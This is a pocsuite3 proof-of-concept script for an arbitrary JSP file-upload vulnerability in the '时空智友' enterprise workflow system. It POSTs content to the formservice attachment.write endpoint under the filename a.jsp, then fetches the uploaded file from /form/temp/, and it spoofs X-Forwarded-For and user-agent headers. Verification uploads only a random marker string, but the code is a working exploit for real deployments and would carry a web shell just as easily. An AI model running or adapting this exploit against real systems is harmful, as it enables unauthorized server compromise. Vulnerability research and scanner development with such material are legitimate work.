#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import contextlib
import re
from poc_tool.tools import tools
from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger
)

minimum_version_required('2.0.5')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = ''
    vulDate = '2023-11-18'
    createDate = '2023-11-18'
    updateDate = '2023-11-18'
    references = []
    name = '时空智友企业流程化管控系统_formservice_文件上传漏洞'
    appPowerLink = ''
    appName = '时空智友'
    appVersion = '时空智友'
    vulType = 'Any file upload'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''

    def _exploit(self, flag):
        headers = {
            'User-agent': tools.get_random_ua(),
            'Accept-Encoding': 'gzip',
            'X-Forwarded-For': tools.get_random_ip()
        }
        res = requests.post(url=f"{self.url}/formservice?service=attachment.write&isattach=false&filename=a.jsp", data=flag, headers=headers, verify=False)
        logger.debug(f"\n\n{tools.get_req(res)}\n\n{tools.get_res(res)}")
        file = re.findall('<root>(.*?)</root>', res.text)
        response = requests.get(url=f"{self.url}/form/temp/{file[0]}")
        logger.debug(f"\n\n{tools.get_req(response)}\n\n{tools.get_res(response)}")
        return response

    def _verify(self):
        with contextlib.suppress(Exception):
            result = {}
            flag = tools.get_random_str(20)
            res = self._exploit(flag)
            if flag in res.text and res.status_code == 200:
                result['VerifyInfo'] = {
                    'URL': self.url,
                    '存在 时空智友企业流程化管控系统_formservice_文件上传漏洞': self.url,
                }
            return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
